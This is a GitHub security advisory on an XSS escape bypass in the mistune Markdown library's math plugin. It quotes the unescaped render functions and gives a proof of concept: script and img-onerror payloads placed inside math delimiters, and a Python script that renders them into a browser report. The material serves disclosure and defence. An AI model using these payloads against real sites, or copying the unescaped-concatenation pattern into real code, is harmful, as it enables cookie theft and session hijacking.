# [M] Mistune Math Plugin has an XSS Escape Bypass

## Summary
Severity: Medium
Advisory: GHSA-8g87-j6q8-g93x
CVE: CVE-2026-44708
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-8g87-j6q8-g93x
Type: github-advisory

## Affected
- PyPI: `mistune` — affected >=0

## Details
## Summary
The mistune math plugin renders inline math (`$...$`) and block math (`$$...$$`) by concatenating the raw user-supplied content directly into the HTML output **without any HTML escaping**. This occurs even when the parser is explicitly created with `escape=True`, which is supposed to guarantee that all user-controlled text is sanitised before reaching the DOM.

The result is a silent contract violation: a developer who enables `escape=True` reasonably expects complete XSS protection, but the math plugin operates as an independent render path that ignores the renderer's `_escape` flag entirely.

## Details
**File:** `src/mistune/plugins/math.py`

```python
def render_inline_math(renderer, text):
    # `text` is raw user input — no escape() call anywhere
    return r'<span class="math">\(' + text + r"\)</span>"

def render_block_math(renderer, text):
    # same issue for block-level $$...$$
    return '<div class="math">$$\n' + text + "\n$$</div>\n"
```

Both functions take `text` directly from the parsed token and concatenate it into the output string. Neither function:
- calls `escape(text)` from `mistune.util`
- checks `renderer._escape`
- calls `safe_entity(text)` or any other sanitisation helper

The `escape=True` flag only influences the main `HTMLRenderer` methods (`paragraph`, `heading`, `codespan`, etc.). Plugin render functions registered via `md.renderer.register()` receive the `renderer` instance but have no mechanism that enforces the escape contract - they must opt in manually, and `math.py` does not.

## PoC
**Step 1 — Establish the baseline (escape=True works for plain HTML)**

The script creates a markdown parser with `escape=True` and the math plugin enabled, then feeds it a raw `<script>` tag that is *not* inside math delimiters:

```python
md = create_markdown(escape=True, plugins=["math"])
bl_src = "<script>alert(document.cookie)</script>\n"
bl_out = str(md(bl_src))
```

Expected and actual output — the script tag is correctly escaped:
```html
<p>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</p>
```

This confirms `escape=True` is working for the normal render path.

**Step 2 — Craft the exploit payload**

Wrap the identical `<script>` payload inside inline math delimiters `$...$`. The content is token-extracted as `text` and handed to `render_inline_math()`:

```python
ex_src = "$<script>alert(document.cookie)</script>$\n"
ex_out = str(md(ex_src))
```

**Step 3 — Observe the bypass**

Actual output — the script tag is emitted raw, unescaped:
```html
<p><span class="math">\(<script>alert(document.cookie)</script>\)</span></p>
```

The `<script>` block is live inside the `<span class="math">` wrapper. Any browser that renders this HTML will execute `alert(document.cookie)`.

**Step 4 — Block math variant (`$$...$$`)**

The same bypass applies to block-level math. Payload:
```
$$
<img src=x onerror="alert(document.cookie)">
$$
```

Output:
```html
<div class="math">$$
<img src=x onerror="alert(document.cookie)">
$$</div>
```

The `onerror` handler fires as soon as the browser tries to load the non-existent image `x`.

### Script

A verification script was written to test this issue. It creates a HTML page showing the bypass rendering in the browser.

```python
#!/usr/bin/env python3
"""H1: Math plugin bypasses escape=True — HTML inside $...$ passes through raw."""
import os, html as h
from mistune import create_markdown

md = create_markdown(escape=True, plugins=["math"])

# --- baseline ---
bl_file = "baseline_h1.md"
bl_src  = "<script>alert(document.cookie)</script>\n"
with open(os.path.join(os.getcwd(), bl_file), "w") as f:
    f.write(bl_src)
bl_out = str(md(bl_src))

print(f"[{bl_file}]\n{bl_src}")
print("[output — escape=True works normally here]")
print(bl_out)

# --- exploit ---
ex_file = "exploit_h1.md"
ex_src  = "$<script>alert(document.cookie)</script>$\n"
with open(os.path.join(os.getcwd(), ex_file), "w") as f:
    f.write(ex_src)
ex_out = str(md(ex_src))

print(f"[{ex_file}]\n{ex_src}")
print("[output — escape=True bypassed inside math delimiters]")
print(ex_out)

# --- HTML report ---
CSS = """
body{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}
h1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}
p.desc{color:#555;font-size:.9em;margin-top:6px}
.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;box-shadow:0 1px 4px rgba(0,0,0,.1)}
.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}
.baseline .case-header{background:#d1fae5;color:#065f46}
.exploit  .case-header{background:#fee2e2;color:#7f1d1d}
.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}
.panel{padding:16px}
.panel+.panel{border-left:1px solid #eee}
.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}
pre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;font-size:.78em;white-space:pre-wrap;word-break:break-all}
.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}
.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;background:#fff;font-size:.9em}
"""

def case(kind, label, filename, src, out):
    return f"""
<div class="case {kind}">
  <div class="case-header">{'BASELINE' if kind=='baseline' else 'EXPLOIT'} — {h.escape(label)}</div>
  <div class="panels">
    <div class="panel">
      <h3>Input — {h.escape(filename)}</h3>
      <pre>{h.escape(src)}</pre>
    </div>
    <div class="panel">
      <h3>Output — HTML source</h3>
      <pre>{h.escape(out)}</pre>
      <div class="rlabel">↓ rendered in browser</div>
      <div class="rendered">{out}</div>
    </div>
  </div>
</div>"""

page = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>H1 — Math XSS</title><style>{CSS}</style></head><body>
<h1>H1 — Math Plugin XSS (escape=True bypass)</h1>
<p class="desc">render_inline_math() in plugins/math.py concatenates user content without escape().
The escape=True renderer flag is completely ignored inside $...$ delimiters.</p>
{case("baseline", "Same HTML outside $...$  — escape=True works", bl_file, bl_src, bl_out)}
{case("exploit",  "Same HTML inside $...$   — escape=True bypassed", ex_file, ex_src, ex_out)}
</body></html>"""

out_path = os.path.join(os.getcwd(), "report_h1.html")
with open(out_path, "w") as f:
    f.write(page)
print(f"\n[report] {out_path}")
```

Example usage:
```bash
python poc.py
```

Once the script is run, open `report_h1.html` in the browser and observe the behaviour.

## Impact
| Dimension        | Assessment |
|------------------|-----------|
| **Confidentiality** | Attacker can exfiltrate session cookies, auth tokens, and any data visible to the victim's browser session |
| **Integrity**    | Attacker can mutate page content, inject phishing forms, redirect the user, or perform authenticated actions |
| **Availability** | Attacker can crash or freeze the page (denial-of-service to the user) |

**Risk amplifier:** This is a *bypass* of an explicit security control. Developers who have audited their application and confirmed `escape=True` is set believe they have XSS protection. This vulnerability silently invalidates that assumption for every math-enabled parser instance, making it likely to be missed in code reviews and security audits.

## References
- https://github.com/lepture/mistune/security/advisories/GHSA-8g87-j6q8-g93x
- https://nvd.nist.gov/vuln/detail/CVE-2026-44708
- https://github.com/lepture/mistune
- https://github.com/lepture/mistune/releases/tag/v3.2.1
